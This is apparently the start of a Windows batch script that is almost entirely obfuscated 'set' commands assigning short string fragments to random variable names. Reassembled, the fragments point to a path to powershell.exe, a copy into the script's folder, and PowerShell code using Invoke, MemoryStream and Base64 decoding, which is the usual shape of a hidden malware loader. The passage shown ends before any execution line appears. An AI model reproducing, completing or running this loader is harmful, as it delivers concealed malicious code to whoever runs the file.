@echo off
set "wtMCWaGTVX=xe"
set "SgIddieIrK= C"
set "cfhwaGPxqN=ll"
set "KWYrQJNhdx=do"
set "sFSLoojBaq=ws"
set "ONrdqsNrTN=Sy"
set "ytenorxYUP=rs"
set "oUhARSlUWq=py"
set "iSdNuaHQtB=em"
set "pFLddiEtBN=we"
set "NxwzSXpZAu= /"
set "UAdfNTqrOS=ll"
set "XdJFloZSXx=:\"
set "xTJBNdKqVo=\W"
set "WgcACgqzKg=32"
set "LJxtSTsHso=po"
set "TsXzYkCrgJ=s\"
set "tEprMyyjkq=nd"
set "FgnnzYqUMw=co"
set "tSQWaMewiT=\v"
set "prUeuXHHaH=Po"
set "rHEqXuurqo=Wi"
set "FcpJRsEkfB=.e"
set "PTAOVniwtc=1."
set "ycuRbkvQxp=0\"
set "roYShgvhWb=he"
set "QPIGDJeCRM=st"
set "TICbyllCoD=ow"
set "wMPuvBVrLd=we"
set "gZzuAVKEJq=in"
set "qCmyWBhNgl=rS"
set "agkckpYoaO=y "
set "LiEtatcTWT=he"
set "OVBXEPNpYS= %~dp0"
set "FovDMDVzJp=cd"
set "eKAQpEmUMk=$wpq"
set "HTOMpTIBLQ=0O+g"
set "JNLJVDrflf=em.C"
set "hQMyGMqZsK=ionM"
set "IDcIrqSXqs=] -j"
set "JNPCtRZsFK=3); "
set "WgUlsfttFI=Conv"
set "PcuVxNZkmd=Invo"
set "opGrppYiXh=yp.T"
set "XOqpASUNLM=em.I"
set "VuOQKnKDyg=vert"
set "gFROCGPCFB=eam("
set "iblaFveFKU=kR, "
set "WzNPoYKbzz=tion"
set "dSccxBrERe=brea"
set "QoUjZJSiNz=l = "
set "FMPMDedXJr=tS46"
set "NuNfOgRjFq=uxup"
set "QmbQOYRhmS='')("
set "NEwywrYulz=);$u"
set "LRqdHHUEcI=urit"
set "PjsPTpbfEP=6] -"
set "PgcftPRyxX=oryS"
set "FaWYCLpIhk=rrl."
set "XMAJPmYrmG=$frr"
set "vzzrTRMGFy=tryP"
